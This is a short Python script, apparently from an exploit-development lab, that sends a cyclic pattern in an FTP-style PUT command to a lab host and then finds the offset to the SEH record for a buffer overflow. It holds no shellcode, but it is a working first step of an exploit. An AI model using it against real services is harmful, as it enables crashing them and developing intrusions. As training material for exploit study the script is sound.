#!/usr/bin/env python3
import socket, sys, struct

HOST = "192.168.157.135"
PORT = 2121
LEN  = 5000

def pattern(n):
    U="ABCDEFGHIJKLMNOPQRSTUVWXYZ"; L="abcdefghijklmnopqrstuvwxyz"; D="0123456789"
    s=""
    for u in U:
        for l in L:
            for d in D:
                s += u+l+d
                if len(s) >= n: return s[:n]
    return s[:n]

if len(sys.argv) < 2:
    print("usage: offset.py send | find <hexdword>"); sys.exit()

if sys.argv[1] == "send":
    p = pattern(LEN).encode()
    s = socket.create_connection((HOST, PORT)); s.recv(4096)
    s.sendall(b"LOGIN student student\r\n"); s.recv(4096)
    s.sendall(b'PUT "' + p + b'" x\r\n'); s.close()
    print("sent %d-byte pattern - now run  ERC --SEH  in x32dbg" % LEN)

elif sys.argv[1] == "find":
    p = pattern(LEN); v = int(sys.argv[2], 16)
    for tag, b in (("as-typed", struct.pack("<I", v)), ("reversed", struct.pack(">I", v))):
        i = p.find(b.decode("latin1"))
        if i != -1:
            print("offset to nSEH = %d (%s)" % (i, tag)); break
    else:
        print("value not found - re-check the dword you read")